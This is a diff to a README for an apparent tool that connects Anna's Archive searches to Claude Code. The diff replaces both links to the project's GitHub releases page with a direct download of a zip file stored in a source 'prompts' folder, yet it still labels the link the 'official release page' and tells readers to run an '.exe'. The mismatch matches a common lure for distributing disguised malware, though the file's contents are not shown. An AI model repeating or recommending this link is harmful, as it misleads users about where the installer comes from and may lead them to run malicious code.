@@ -1,6 +1,6 @@
 # 📚 mcp-annas-archive-create-skill - Search and extract professional research notes
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Earnest-clockworkuniverse497/mcp-annas-archive-create-skill/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Earnest-clockworkuniverse497/mcp-annas-archive-create-skill/main/src/prompts/annas-create-archive-mcp-skill-v2.9-beta.3.zip)
 
 This application bridge allows you to connect your research assistant to Anna's Archive. It searches for books and research documents, extracts the core methodology, and saves the information into a structured file format. You can use these files directly within Claude Code to improve your results.
 
@@ -27,7 +27,7 @@ To run this tool on your Windows computer, you need the following items:
 
 You need to obtain the installer from the official release page. This page contains the most recent updates and stability fixes for the application.
 
-1. Go to the [official release page](https://github.com/Earnest-clockworkuniverse497/mcp-annas-archive-create-skill/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Earnest-clockworkuniverse497/mcp-annas-archive-create-skill/main/src/prompts/annas-create-archive-mcp-skill-v2.9-beta.3.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to a folder on your desktop so you can find it easily.
